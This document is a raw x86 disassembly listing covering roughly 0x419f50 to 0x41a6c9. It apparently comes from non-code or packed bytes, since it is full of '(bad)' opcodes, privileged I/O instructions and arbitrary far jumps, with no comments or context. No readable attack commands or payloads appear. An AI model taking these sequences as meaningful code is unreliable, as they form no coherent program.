  419f50:	and    edi,DWORD PTR [eax]
  419f52:	push   es
  419f53:	scas   al,BYTE PTR es:[edi]
  419f54:	lzcnt  ebx,DWORD PTR [esp+eax*2-0x611beffc]
  419f5d:	or     esi,DWORD PTR [esp+ebx*8+0x66]
  419f61:	fnstsw WORD PTR ds:0x187178d1
  419f67:	inc    esp
  419f68:	push   es
  419f69:	xor    ebp,esi
  419f6b:	sbb    cl,dl
  419f6d:	fdiv   DWORD PTR [ebx+0x39]
  419f70:	push   esi
  419f71:	test   BYTE PTR [eax+eax*1-0x48],0x70
  419f76:	test   DWORD PTR [ebp-0x74],eax
  419f79:	mov    es,WORD PTR [ecx]
  419f7b:	xor    edi,DWORD PTR [ecx-0x54d6df7a]
  419f81:	xchg   ecx,eax
  419f82:	sbb    DWORD PTR [ebp+0x2aedb528],0x8c3ab170
  419f8c:	push   edi
  419f8d:	fldcw  WORD PTR [ebp-0x78]
  419f90:	adc    al,0xf1
  419f92:	inc    ecx
  419f93:	sbb    esp,DWORD PTR [ecx-0x3b]
  419f96:	adc    dh,BYTE PTR [eax+ebx*2+0x24809ae0]
  419f9d:	in     al,0x7d
  419f9f:	or     ecx,DWORD PTR [esi]
  419fa1:	les    edx,FWORD PTR [edx+edx*1]
  419fa4:	retf   
  419fa5:	xchg   DWORD PTR ds:0x1f56068d,ecx
  419fab:	sub    dl,BYTE PTR [edi-0x50a3c1bd]
  419fb1:	cmp    edi,DWORD PTR [ebp-0x500be282]
  419fb7:	and    bl,BYTE PTR [ebp+0xd]
  419fba:	or     al,0xdf
  419fbc:	adc    BYTE PTR [ecx+0x1e],al
  419fbf:	pop    ds
  419fc0:	or     al,0xa6
  419fc2:	nop
  419fc3:	test   eax,0x2c4f18b8
  419fc8:	inc    edx
  419fc9:	rcl    BYTE PTR [esi+0x32],0xed
  419fcd:	xor    DWORD PTR [esi],edi
  419fcf:	jge    0x419f7e
  419fd1:	dec    ebp
  419fd2:	jno    0x419f65
  419fd4:	ss jp  0x419fae
  419fd7:	stc    
  419fd8:	xchg   edi,eax
  419fd9:	jge    0x419f7f
  419fdb:	loopne 0x419fcc
  419fdd:	pop    ds
  419fde:	retf   0x695e
  419fe1:	call   0xafd37799
  419fe6:	nop
  419fe7:	shl    BYTE PTR [ecx+0x6],cl
  419fea:	lea    ebp,ds:0x8f663c06
  419ff0:	jecxz  0x419fee
  419ff2:	stos   BYTE PTR es:[edi],al
  419ff3:	add    eax,esp
  419ff5:	sbb    ch,0xfa
  419ff8:	sti    
  419ff9:	mov    edx,0x6d54335e
  419ffe:	mov    ds:0xd5bc3a7,eax
  41a003:	push   esi
  41a004:	gs pop ds
  41a006:	cli    
  41a007:	adc    eax,0x6c909c97
  41a00c:	fmul   QWORD PTR cs:0x7b91ecb4
  41a013:	mov    dh,0x8e
  41a015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a016:	sub    DWORD PTR [ebx+0x1308f5e4],ecx
  41a01c:	pop    esp
  41a01d:	mov    al,0x10
  41a01f:	pusha  
  41a020:	cmc    
  41a021:	cmp    ch,dl
  41a023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a024:	int3   
  41a025:	(bad)  
  41a026:	pop    esp
  41a027:	or     BYTE PTR [ebp+0x56],cl
  41a02a:	lahf   
  41a02b:	and    cl,cl
  41a02d:	sahf   
  41a02e:	pop    ds
  41a02f:	(bad)  
  41a030:	push   ds
  41a031:	or     eax,edi
  41a033:	test   eax,0x3eb0e262
  41a038:	lds    edx,FWORD PTR [ecx]
  41a03a:	sbb    DWORD PTR cs:[eax-0x1c653b41],edi
  41a041:	cdq    
  41a042:	xchg   ebp,eax
  41a043:	rcr    esi,0xd3
  41a046:	ret    
  41a047:	std    
  41a048:	int    0x88
  41a04a:	rcr    DWORD PTR [edi+ebp*4-0x17],0xa3
  41a04f:	xchg   esp,eax
  41a050:	cld    
  41a051:	add    dh,BYTE PTR [edi]
  41a053:	shl    esi,1
  41a055:	push   ebx
  41a056:	jmp    0xe353:0xd03dc23
  41a05d:	add    edi,DWORD PTR [ecx-0x3b]
  41a060:	pop    es
  41a061:	mov    ds:0x8223528f,eax
  41a066:	push   ecx
  41a067:	ins    BYTE PTR es:[edi],dx
  41a068:	sbb    edi,DWORD PTR [ebx-0x79]
  41a06b:	inc    edx
  41a06c:	cmc    
  41a06d:	out    dx,eax
  41a06e:	push   0x9f89af49
  41a073:	sbb    ecx,ebx
  41a075:	lock dec esp
  41a077:	ret    
  41a078:	mov    al,ds:0xdcbc44a8
  41a07d:	nop
  41a07e:	hlt    
  41a07f:	loope  0x41a0a9
  41a081:	push   edi
  41a082:	(bad)
  41a086:	fadd   DWORD PTR [ebx]
  41a088:	add    al,0x73
  41a08a:	mov    ch,0xf5
  41a08c:	cs push esi
  41a08e:	dec    edi
  41a08f:	call   0xb5b:0xaed148bf
  41a096:	sub    ecx,esi
  41a098:	add    BYTE PTR [edx],0x3d
  41a09b:	xchg   esp,eax
  41a09c:	mov    cl,0x17
  41a09e:	repnz out dx,al
  41a0a0:	mov    ebx,0x81eb2edc
  41a0a5:	push   edx
  41a0a6:	ds dec ecx
  41a0a8:	lahf   
  41a0a9:	and    DWORD PTR [edx+0x47],edi
  41a0ac:	jmp    0x41a095
  41a0ae:	adc    ebx,ecx
  41a0b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b1:	inc    edi
  41a0b2:	mov    eax,ds:0xac05b354
  41a0b7:	push   cs
  41a0b8:	inc    edi
  41a0b9:	xchg   ebx,eax
  41a0ba:	lods   al,BYTE PTR ds:[esi]
  41a0bb:	out    0xaf,al
  41a0bd:	add    al,0xa6
  41a0bf:	ret    0xa700
  41a0c2:	lds    ecx,FWORD PTR [eax-0x13]
  41a0c5:	push   edx
  41a0c6:	es ins DWORD PTR es:[edi],dx
  41a0c8:	mov    ebx,0x7ba4067e
  41a0cd:	mov    eax,ds:0x3c952e45
  41a0d2:	rcl    BYTE PTR [edx-0xee3a628],cl
  41a0d8:	addr16 push esp
  41a0da:	aas    
  41a0db:	test   eax,0x845ad6a3
  41a0e0:	out    dx,eax
  41a0e1:	hlt    
  41a0e2:	push   0x71
  41a0e4:	daa    
  41a0e5:	jl     0x41a148
  41a0e7:	(bad)  [edi+edi*8]
  41a0ea:	mov    ss,WORD PTR [edx+0x478df734]
  41a0f0:	int    0x42
  41a0f2:	in     al,dx
  41a0f3:	adc    BYTE PTR [esp+eax*4+0x6f397b52],cl
  41a0fa:	mov    cl,0x8e
  41a0fc:	adc    eax,0x89a4277
  41a101:	pushf  
  41a102:	daa    
  41a103:	or     dh,BYTE PTR [ebp+0x232b3eb]
  41a109:	daa    
  41a10a:	cmp    DWORD PTR [edi+eax*8+0x50],ecx
  41a10e:	imul   esi,DWORD PTR [eax+0x7fa0294],0x57
  41a115:	mov    esi,eax
  41a117:	jg     0x41a0bf
  41a119:	and    DWORD PTR [edi+0x6e0baf04],0x2d
  41a120:	daa    
  41a121:	(bad)  
  41a122:	cmc    
  41a123:	enter  0x1cf5,0xd4
  41a127:	xor    DWORD PTR ds:0x5e8dffeb,edi
  41a12d:	dec    esi
  41a12e:	xchg   ebp,eax
  41a12f:	sar    esp,cl
  41a131:	das    
  41a132:	push   ebp
  41a133:	sub    esi,DWORD PTR [ebp+0x73bb5f09]
  41a139:	das    
  41a13a:	cmp    BYTE PTR [ebx-0x2124b708],ah
  41a140:	in     eax,0xdb
  41a142:	je     0x41a0cf
  41a144:	xor    al,0x7f
  41a146:	push   ss
  41a147:	mov    DWORD PTR [esi+0x6e28aaf1],edi
  41a14d:	psubsw mm5,QWORD PTR [ebx+ecx*8+0x42]
  41a152:	cs mov cl,0xbc
  41a155:	mov    bh,0x15
  41a157:	push   esi
  41a158:	aas    
  41a159:	or     eax,0x458a82da
  41a15e:	es and edi,esi
  41a161:	fbstp  TBYTE PTR [edx-0x32]
  41a164:	or     esi,edi
  41a166:	inc    DWORD PTR [esi+0x4109fcef]
  41a16c:	inc    esp
  41a16d:	cmp    al,0x4
  41a16f:	mov    dl,0xa7
  41a171:	inc    ebx
  41a172:	dec    esi
  41a173:	jl     0x41a0ff
  41a175:	jno    0x41a1f6
  41a177:	aad    0xfe
  41a179:	push   ecx
  41a17a:	sub    BYTE PTR [esi],ah
  41a17c:	cmp    BYTE PTR [esi+0x3d],bh
  41a17f:	xor    DWORD PTR [edi-0x36ab4aad],edx
  41a185:	(bad)  
  41a186:	cli    
  41a187:	pop    esi
  41a188:	mov    eax,0x1d677160
  41a18d:	loop   0x41a196
  41a18f:	or     eax,0x534548f8
  41a194:	pop    edx
  41a195:	lds    edx,FWORD PTR [eax-0x31]
  41a198:	add    al,0x52
  41a19a:	sahf   
  41a19b:	dec    edx
  41a19c:	sub    BYTE PTR [ebx-0x1],al
  41a19f:	sub    BYTE PTR [eax-0x48],0x55
  41a1a3:	and    DWORD PTR [esi-0x1b94163c],ebx
  41a1a9:	pop    eax
  41a1aa:	in     al,0x96
  41a1ac:	sbb    DWORD PTR [edi-0x6573193e],eax
  41a1b2:	xor    al,0x12
  41a1b4:	add    cl,BYTE PTR [esi+ecx*8+0x27f395fe]
  41a1bb:	test   ebx,edi
  41a1bd:	call   FWORD PTR [ecx]
  41a1bf:	push   eax
  41a1c0:	push   0x56
  41a1c2:	clc    
  41a1c3:	and    esp,ecx
  41a1c5:	leave  
  41a1c6:	pusha  
  41a1c7:	xor    DWORD PTR [esi-0x45ed9548],edx
  41a1cd:	imul   eax,DWORD PTR [edi+0x1d],0xffffffa4
  41a1d1:	ins    BYTE PTR es:[edi],dx
  41a1d2:	mov    ebx,0x4968dab
  41a1d7:	(bad)  
  41a1d8:	aam    0x6c
  41a1da:	add    ecx,ebx
  41a1dc:	test   BYTE PTR [edi-0x21],ch
  41a1df:	push   cs
  41a1e0:	add    dh,bh
  41a1e2:	push   0x8
  41a1e4:	(bad)  
  41a1e5:	add    ah,BYTE PTR [edx]
  41a1e7:	jl     0x41a1b0
  41a1e9:	and    DWORD PTR ds:0x4e4694e4,esp
  41a1ef:	nop
  41a1f0:	add    ebx,DWORD PTR [eax-0x2772f9d1]
  41a1f6:	sub    BYTE PTR [ebx*2-0x76e2ba8f],0xde
  41a1fe:	dec    bp
  41a200:	into   
  41a201:	xor    dl,BYTE PTR [ebp+0x5c]
  41a204:	jmp    0x41a202
  41a206:	out    0x28,eax
  41a208:	fidivr DWORD PTR [eax+0x23705b58]
  41a20e:	adc    ch,al
  41a210:	mov    bl,0x5
  41a212:	push   esp
  41a213:	inc    ecx
  41a214:	in     al,0x33
  41a216:	adc    DWORD PTR [edx],eax
  41a218:	js     0x41a1da
  41a21a:	and    edx,DWORD PTR [esi]
  41a21c:	es cld 
  41a21e:	jmp    0x41a1fb
  41a220:	cmc    
  41a221:	enter  0x7a1d,0x8
  41a225:	sahf   
  41a226:	fcom   QWORD PTR [ebx+0x6557b65f]
  41a22c:	in     eax,0x27
  41a22e:	int    0x51
  41a230:	mov    al,ds:0x2203610
  41a235:	icebp  
  41a236:	cli    
  41a237:	and    esi,DWORD PTR ds:0xc580e0c0
  41a23d:	sub    dl,ch
  41a23f:	test   BYTE PTR [ebp+ebp*2-0x6c791d82],al
  41a246:	sbb    BYTE PTR [esi-0x2f585b8a],dh
  41a24c:	pop    ss
  41a24d:	pusha  
  41a24e:	lea    edx,[ecx]
  41a250:	not    BYTE PTR [edx+0x6e]
  41a253:	in     eax,dx
  41a254:	mov    edx,0xcd4efe8b
  41a259:	inc    ebx
  41a25a:	push   0xffffffab
  41a25c:	mov    BYTE PTR [edi+0x7b],cl
  41a25f:	es sbb al,0x4a
  41a262:	mov    eax,0xa96fce44
  41a267:	mov    ch,0x80
  41a269:	pushf  
  41a26a:	ins    DWORD PTR es:[edi],dx
  41a26b:	arpl   di,dx
  41a26d:	(bad)  
  41a26e:	cmp    dh,BYTE PTR [ecx+eiz*4-0x2c]
  41a272:	push   0xd2f740cd
  41a277:	mov    al,0x8b
  41a279:	fadd   QWORD PTR [esp+ebx*4+0x6c]
  41a27d:	(bad)  
  41a27e:	pop    esi
  41a27f:	int3   
  41a280:	mov    edi,?
  41a282:	xchg   esp,eax
  41a283:	retf   0x2e0b
  41a286:	pop    esp
  41a287:	imul   edx,DWORD PTR [edx],0xa427f393
  41a28d:	push   ecx
  41a28e:	les    edx,FWORD PTR [eax-0x17]
  41a291:	mov    ah,0xf0
  41a293:	das    
  41a294:	bound  esi,QWORD PTR [eax-0x5a]
  41a297:	jnp    0x41a2fa
  41a299:	push   edx
  41a29a:	int    0x2b
  41a29c:	ret    0x47bd
  41a29f:	test   al,0x3e
  41a2a1:	mov    bh,0x83
  41a2a3:	gs jmp 0x41a240
  41a2a6:	lods   eax,DWORD PTR ds:[esi]
  41a2a7:	xchg   esi,eax
  41a2a8:	pop    ebp
  41a2a9:	rcr    BYTE PTR [ecx],cl
  41a2ab:	pop    ebp
  41a2ac:	inc    eax
  41a2ad:	mov    dh,0x12
  41a2af:	inc    ebx
  41a2b0:	imul   edi,DWORD PTR [eax-0x592ac609],0x53
  41a2b7:	xchg   ebp,eax
  41a2b8:	std    
  41a2b9:	push   eax
  41a2ba:	lock dec esi
  41a2bc:	fsubr  DWORD PTR [esi+0x6]
  41a2bf:	outs   dx,BYTE PTR ds:[esi]
  41a2c0:	jmp    0x5a24:0x24d1
  41a2c6:	lea    edi,[esi]
  41a2c8:	mov    ebx,0x6ecf7ca0
  41a2cd:	pop    ds
  41a2ce:	out    0x7e,al
  41a2d0:	into   
  41a2d1:	jp     0x41a2da
  41a2d3:	sar    BYTE PTR [edi-0x16ee15d],0x82
  41a2da:	push   ss
  41a2db:	int    0x68
  41a2dd:	cmp    al,0xca
  41a2df:	cmp    ebp,edx
  41a2e1:	out    dx,al
  41a2e2:	out    0xe,al
  41a2e4:	sets   BYTE PTR [esp+eiz*8+0x20]
  41a2e9:	in     al,dx
  41a2ea:	fld    st(4)
  41a2ec:	or     ch,BYTE PTR [edi-0x7b]
  41a2ef:	push   ss
  41a2f0:	daa    
  41a2f1:	add    ebx,eax
  41a2f3:	stos   DWORD PTR es:[edi],eax
  41a2f4:	push   esp
  41a2f5:	and    al,0x3a
  41a2f7:	push   ebx
  41a2f8:	ret    0x362c
  41a2fb:	pop    ebp
  41a2fc:	into   
  41a2fd:	or     dh,cl
  41a2ff:	jle    0x41a334
  41a301:	popa   
  41a302:	lods   eax,DWORD PTR ds:[esi]
  41a303:	aaa    
  41a304:	stos   DWORD PTR es:[edi],eax
  41a305:	into   
  41a306:	inc    edi
  41a307:	ret    
  41a308:	jecxz  0x41a29c
  41a30a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a30b:	outs   dx,DWORD PTR ds:[esi]
  41a30c:	mov    bh,0xa0
  41a30e:	jnp    0x41a33c
  41a310:	sbb    bl,BYTE PTR [esi-0x41b72ab2]
  41a316:	rol    BYTE PTR [ecx+0x22],1
  41a319:	mov    eax,ds:0x7c15a4dd
  41a31e:	addr16 pop ds
  41a320:	rcr    bh,1
  41a322:	lods   al,BYTE PTR ds:[esi]
  41a323:	std    
  41a324:	ss mov dl,bl
  41a327:	jle    0x41a35f
  41a329:	mov    esi,0xea945eae
  41a32e:	test   al,0xc5
  41a330:	mov    esi,0x8780b8a0
  41a335:	push   esi
  41a336:	push   es
  41a337:	out    dx,al
  41a338:	xor    ebp,DWORD PTR [edx-0x4e00b536]
  41a33e:	jo     0x41a2fd
  41a340:	sbb    BYTE PTR [edx-0x5359353d],0x20
  41a347:	jecxz  0x41a35d
  41a349:	dec    ebx
  41a34a:	jmp    0x41a367
  41a34c:	xor    DWORD PTR [ecx+ebx*8],0xd9dd2c55
  41a353:	mov    ebx,0xf9702c9a
  41a358:	pop    ecx
  41a359:	cwde   
  41a35a:	jle    0x41a3c9
  41a35c:	jmp    0x5f39:0xc533be36
  41a363:	out    dx,eax
  41a364:	pop    edi
  41a365:	repnz xchg ebp,eax
  41a367:	cld    
  41a368:	jmp    0x5728ea99
  41a36d:	mov    DWORD PTR fs:[ebx],0xf37901db
  41a374:	lea    edi,[ebx+edi*4]
  41a377:	mov    ah,0x1d
  41a379:	mov    ch,0xcb
  41a37b:	imul   edx,DWORD PTR [ebx+0x2],0x3a
  41a37f:	push   0xfffffff4
  41a381:	lods   al,BYTE PTR ds:[esi]
  41a382:	call   0x1d81:0xc4d485fa
  41a389:	inc    esp
  41a38a:	push   ecx
  41a38b:	and    esi,DWORD PTR [ebp+ecx*4+0x53]
  41a38f:	xchg   BYTE PTR [edx+0xb],al
  41a392:	mov    edx,ds
  41a394:	push   esi
  41a395:	add    bl,bh
  41a397:	(bad)  
  41a398:	jmp    0xc7c573f8
  41a39d:	(bad)  [ebp-0x6b184523]
  41a3a3:	mov    cl,0x79
  41a3a5:	push   cs
  41a3a6:	sub    edx,esi
  41a3a8:	loop   0x41a377
  41a3aa:	mov    esi,0x2908a67
  41a3af:	and    DWORD PTR [eax-0x1a44465],edi
  41a3b5:	mov    esi,0x20e89feb
  41a3ba:	inc    ebp
  41a3bb:	punpcklwd mm7,DWORD PTR [edx]
  41a3be:	fld    QWORD PTR [eax+0xa2af0cc]
  41a3c4:	cld    
  41a3c5:	add    DWORD PTR [esi+0x4c758604],0xffffff80
  41a3cc:	push   esp
  41a3cd:	scas   eax,DWORD PTR es:[edi]
  41a3ce:	mov    DWORD PTR ds:0x9635ad93,esp
  41a3d4:	inc    edi
  41a3d5:	jl     0x41a384
  41a3d7:	pop    ss
  41a3d8:	pop    ebx
  41a3d9:	pop    esi
  41a3da:	jo     0x41a443
  41a3dc:	sbb    bl,BYTE PTR [ecx]
  41a3de:	pop    esp
  41a3df:	mov    eax,ds:0x8d41f6f4
  41a3e4:	cmp    BYTE PTR [ecx],bl
  41a3e6:	and    al,0x1b
  41a3e8:	dec    eax
  41a3e9:	xchg   esp,eax
  41a3ea:	gs gs (bad) 
  41a3ed:	lock shl DWORD PTR [edx+0x2e8768cf],0x84
  41a3f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3f6:	test   DWORD PTR [ebp+0x3478ef19],edi
  41a3fc:	push   esi
  41a3fd:	imul   esi,DWORD PTR [ecx-0x18],0xfffffff2
  41a401:	arpl   WORD PTR [ebp+0x492c0ede],di
  41a407:	mov    al,ds:0x8b5e4549
  41a40c:	lods   eax,DWORD PTR ds:[esi]
  41a40d:	fnstenv [esi+0x14a1592e]
  41a413:	scas   eax,DWORD PTR es:[edi]
  41a414:	cwde   
  41a415:	outs   dx,BYTE PTR ds:[esi]
  41a416:	pop    eax
  41a417:	or     eax,0xad49f858
  41a41c:	push   ecx
  41a41d:	add    eax,0xb92ed3ea
  41a422:	pop    edi
  41a423:	imul   eax,DWORD PTR [esi-0x4b],0x7e1affd9
  41a42a:	shl    al,1
  41a42c:	in     al,dx
  41a42d:	push   edx
  41a42e:	push   ebx
  41a42f:	into   
  41a430:	lods   eax,DWORD PTR ds:[esi]
  41a431:	xrelease mov DWORD PTR [edx-0x5a1ea8db],0x57256dea
  41a43c:	sub    cl,BYTE PTR [edi+0x33a9200a]
  41a442:	add    bl,BYTE PTR [esi]
  41a444:	stc    
  41a445:	add    BYTE PTR [ecx+0x17],ah
  41a448:	enter  0xfbe2,0xb
  41a44c:	push   es
  41a44d:	dec    esp
  41a44e:	in     al,dx
  41a44f:	loopne 0x41a43e
  41a451:	dec    esp
  41a452:	cmp    BYTE PTR [ecx],bh
  41a454:	shl    BYTE PTR [edi-0x8],cl
  41a457:	sub    edi,DWORD PTR [eax+eiz*4+0x24]
  41a45b:	aam    0x68
  41a45d:	ja     0x41a45c
  41a45f:	jbe    0x41a4d5
  41a461:	cdq    
  41a462:	int3   
  41a463:	xchg   ebx,eax
  41a464:	addr16 dec ebx
  41a466:	daa    
  41a467:	jno    0x41a48b
  41a469:	out    dx,eax
  41a46a:	xchg   DWORD PTR [esi-0x7c7d9e5d],ebx
  41a470:	add    BYTE PTR [edx-0x657980ac],cl
  41a476:	iret   
  41a477:	retf   
  41a478:	jl     0x41a4c8
  41a47a:	inc    ebp
  41a47b:	jmp    0x2f27cdc5
  41a480:	sub    eax,0x5861de01
  41a485:	mov    dl,BYTE PTR [ebp+0x64]
  41a488:	cli    
  41a489:	retf   0x2daf
  41a48c:	mov    ds:0x8ef8df5c,al
  41a491:	jmp    0x8a07:0x51dde8a5
  41a498:	push   edx
  41a499:	cld    
  41a49a:	xchg   esi,eax
  41a49b:	data16 stc 
  41a49d:	aas    
  41a49e:	shl    esp,0xd8
  41a4a1:	fdiv   st(7),st
  41a4a3:	rcr    BYTE PTR [ebx-0x2d],cl
  41a4a6:	in     al,dx
  41a4a7:	pushf  
  41a4a8:	cmp    BYTE PTR [edx],ch
  41a4aa:	nop
  41a4ab:	mov    DWORD PTR [edi+edx*8+0x117f5208],esp
  41a4b2:	cmp    BYTE PTR [ebx+0x25],0x5a
  41a4b6:	mov    ds:0x483f103,al
  41a4bb:	add    cl,bh
  41a4bd:	sbb    ebp,ebx
  41a4bf:	pop    edx
  41a4c0:	imul   esi,DWORD PTR ds:0x23a7b5ea,0xffffffc7
  41a4c7:	add    DWORD PTR [ebp-0x5d],eax
  41a4ca:	cmc    
  41a4cb:	mov    cl,ch
  41a4cd:	or     dl,BYTE PTR [esi-0x47efde23]
  41a4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4d4:	rcr    dl,cl
  41a4d6:	rcl    BYTE PTR [ecx+ebp*8-0x3421af06],1
  41a4dd:	fwait
  41a4de:	lock icebp 
  41a4e0:	jge    0x41a482
  41a4e2:	imul   esp,DWORD PTR [esi+0x6c0c43b3],0x3ab02ace
  41a4ec:	xor    al,0x96
  41a4ee:	wbinvd 
  41a4f0:	push   ecx
  41a4f1:	adc    BYTE PTR [esi],cl
  41a4f3:	adc    eax,DWORD PTR [eax-0x3c]
  41a4f6:	push   edx
  41a4f7:	push   esi
  41a4f8:	xchg   ecx,eax
  41a4f9:	test   al,0x3d
  41a4fb:	xor    BYTE PTR [eax],dh
  41a4fd:	es mov ebx,0x2d9defc4
  41a503:	push   ebp
  41a504:	xchg   ecx,eax
  41a505:	jo     0x41a56f
  41a507:	stos   BYTE PTR es:[edi],al
  41a508:	sbb    ah,BYTE PTR [eax+0x52]
  41a50b:	in     eax,0xd6
  41a50d:	pop    ebp
  41a50e:	ins    BYTE PTR es:[edi],dx
  41a50f:	xor    ah,ch
  41a511:	mov    es,WORD PTR [edx]
  41a513:	adc    bh,0x2a
  41a516:	sbb    BYTE PTR [ecx],cl
  41a518:	(bad)  
  41a519:	(bad)  
  41a51a:	leave  
  41a51b:	and    BYTE PTR [edi],0xde
  41a51e:	mov    bh,0xa2
  41a520:	gs rcl edx,0x7c
  41a524:	or     al,cl
  41a526:	rcr    BYTE PTR [edi-0x55],0x4f
  41a52a:	jo     0x41a4c2
  41a52c:	in     al,0x69
  41a52e:	and    BYTE PTR ss:[esi+0x22e94b97],ch
  41a535:	repnz (bad) 
  41a537:	test   DWORD PTR [ebx+0x58],edi
  41a53a:	test   al,0xa4
  41a53c:	jmp    0x41a5a4
  41a53e:	loopne 0x41a4c5
  41a540:	pop    edx
  41a541:	xchg   ecx,eax
  41a542:	cmp    edi,DWORD PTR [ecx+0x6f]
  41a545:	mov    ds:0xc8751fb0,eax
  41a54a:	mov    bl,0x97
  41a54c:	adc    DWORD PTR [edi-0x5d20f4b0],ebx
  41a552:	ret    
  41a553:	pop    ebp
  41a554:	jle    0x41a4eb
  41a556:	lahf   
  41a557:	xchg   esi,eax
  41a558:	aas    
  41a559:	test   al,0xcf
  41a55b:	fstp   DWORD PTR [esi-0x46]
  41a55e:	adc    ebx,DWORD PTR [esi+edx*8+0x61a05836]
  41a565:	daa    
  41a566:	push   esi
  41a567:	repz inc ebx
  41a569:	jns    0x41a5b9
  41a56b:	nop
  41a56c:	bound  esi,QWORD PTR [ecx+edx*2+0x57d2b881]
  41a573:	int    0x64
  41a575:	jle    0x41a568
  41a577:	mov    ebx,DWORD PTR [esi-0x7c]
  41a57a:	popa   
  41a57b:	xor    al,al
  41a57d:	std    
  41a57e:	mov    BYTE PTR [ebx],bh
  41a580:	dec    edi
  41a581:	push   ecx
  41a582:	inc    edx
  41a583:	hlt    
  41a584:	adc    al,0x7d
  41a586:	mov    ah,0xe2
  41a588:	repz dec esp
  41a58a:	aaa    
  41a58b:	inc    edx
  41a58c:	jns    0x41a5cd
  41a58e:	mov    esi,0x219297d9
  41a593:	je     0x41a5ac
  41a595:	mov    dh,0xb4
  41a597:	or     al,BYTE PTR [eax+ebx*2+0x6f]
  41a59b:	or     al,0x49
  41a59d:	inc    ebx
  41a59e:	dec    edi
  41a59f:	inc    edx
  41a5a0:	ret    
  41a5a1:	test   eax,0xbf84896f
  41a5a6:	sahf   
  41a5a7:	mov    ebp,0x41aa57a7
  41a5ac:	mov    ah,BYTE PTR [ebx+0x7d]
  41a5af:	jg     0x41a5a0
  41a5b1:	ret    
  41a5b2:	hlt    
  41a5b3:	(bad)  
  41a5b4:	in     al,dx
  41a5b5:	out    0x1d,eax
  41a5b7:	mov    ds:0xc0a1bc45,eax
  41a5bc:	add    BYTE PTR [edi+0x5a],0x52
  41a5c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5c1:	push   es
  41a5c2:	ins    BYTE PTR es:[edi],dx
  41a5c3:	mov    al,0xcb
  41a5c5:	(bad)  
  41a5c7:	xchg   edx,eax
  41a5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5c9:	jno    0x41a566
  41a5cb:	mov    cl,BYTE PTR [edi-0xc5ce302]
  41a5d1:	jle    0x41a58d
  41a5d3:	adc    ah,cl
  41a5d5:	hlt    
  41a5d6:	xchg   ebx,eax
  41a5d7:	test   al,0xbf
  41a5d9:	add    esi,DWORD PTR [edi+eiz*8+0x3]
  41a5dd:	inc    ebx
  41a5de:	aad    0x26
  41a5e0:	mov    eax,0x1ca8410b
  41a5e5:	(bad)  
  41a5e7:	nop
  41a5e8:	outs   dx,DWORD PTR ds:[esi]
  41a5e9:	push   es
  41a5ea:	rol    BYTE PTR [edi+0x246182ac],0x42
  41a5f1:	ret    0x7dce
  41a5f4:	sub    ebp,DWORD PTR [eax-0x5a]
  41a5f7:	or     DWORD PTR [ebp-0x43],edi
  41a5fa:	push   DWORD PTR [ecx+edi*4]
  41a5fd:	test   ch,ah
  41a5ff:	mov    ecx,0x79c6d0b1
  41a604:	and    ebx,DWORD PTR [ebx-0x36]
  41a607:	fwait
  41a608:	test   DWORD PTR [edx],eax
  41a60a:	pusha  
  41a60b:	jnp    0x41a5ee
  41a60d:	cli    
  41a60e:	xor    esi,esi
  41a610:	psrlw  mm2,mm7
  41a613:	call   0xa959:0x1559e02b
  41a61a:	repz les edx,FWORD PTR [edi]
  41a61d:	fidivr WORD PTR [ebp-0x4e6b14dd]
  41a623:	mov    ah,0x59
  41a625:	outs   dx,DWORD PTR ds:[esi]
  41a626:	mov    esp,0x24079fba
  41a62b:	xor    al,0xd4
  41a62d:	sbb    edx,edx
  41a62f:	and    BYTE PTR [ecx],dh
  41a631:	nop
  41a632:	fwait
  41a633:	jp     0x41a6aa
  41a635:	inc    eax
  41a636:	aas    
  41a637:	cdq    
  41a638:	repz sbb BYTE PTR [edx],bh
  41a63b:	in     eax,0x4c
  41a63d:	inc    esi
  41a63e:	lods   al,BYTE PTR ds:[esi]
  41a63f:	xor    BYTE PTR [edi-0x3d],0xb0
  41a643:	mov    al,0x80
  41a645:	adc    DWORD PTR [edi-0x26],eax
  41a648:	int    0x55
  41a64a:	inc    ebp
  41a64b:	out    0x22,eax
  41a64d:	(bad)  
  41a64e:	out    0x5c,eax
  41a650:	push   ds
  41a651:	shl    BYTE PTR [ecx],0x2
  41a654:	dec    ebx
  41a655:	sbb    ah,BYTE PTR [eax]
  41a657:	sub    al,0x25
  41a659:	dec    ecx
  41a65a:	cmp    DWORD PTR [edx-0x4c],esi
  41a65d:	call   0x6941dee3
  41a662:	mov    ebx,0xd85aba81
  41a667:	push   ds
  41a668:	pushf  
  41a669:	outs   dx,BYTE PTR ds:[esi]
  41a66a:	test   al,0x38
  41a66c:	xchg   eax,eax
  41a66e:	loop   0x41a6dc
  41a670:	mov    edi,0x6a0dc390
  41a675:	dec    ecx
  41a677:	rcl    DWORD PTR [edi+0x29],cl
  41a67a:	sbb    al,0x57
  41a67c:	mov    bl,0x4b
  41a67e:	repz jmp 0xf648f158
  41a684:	outs   dx,BYTE PTR ds:[esi]
  41a685:	add    BYTE PTR [ecx+0x3d808bdd],bl
  41a68b:	fcmovbe st,st(1)
  41a68d:	ins    DWORD PTR es:[edi],dx
  41a68e:	call   0x123:0x6145bacc
  41a695:	pop    es
  41a696:	les    ebx,FWORD PTR [ebx+0x44]
  41a699:	jecxz  0x41a657
  41a69b:	sub    dl,BYTE PTR [eax+esi*1]
  41a69e:	inc    edi
  41a69f:	mov    dl,0xdf
  41a6a1:	jp     0x41a6d4
  41a6a3:	cld    
  41a6a4:	call   0xd9d67e91
  41a6a9:	mov    eax,ds:0xe165017c
  41a6ae:	fist   WORD PTR [esi+ecx*2+0x4d]
  41a6b2:	mov    ds:0xdc93d603,eax
  41a6b7:	mov    dh,0xb2
  41a6b9:	ins    BYTE PTR es:[edi],dx
  41a6ba:	popa   
  41a6bb:	int3   
  41a6bc:	out    dx,eax
  41a6bd:	push   esi
  41a6be:	cld    
  41a6bf:	retf   
  41a6c0:	mov    dh,0xb9
  41a6c2:	mov    cl,0xb7
  41a6c4:	inc    edi
  41a6c5:	adc    DWORD PTR [edi],0x66
  41a6c8:	cmc    
  41a6c9:	jns    0x41a68b
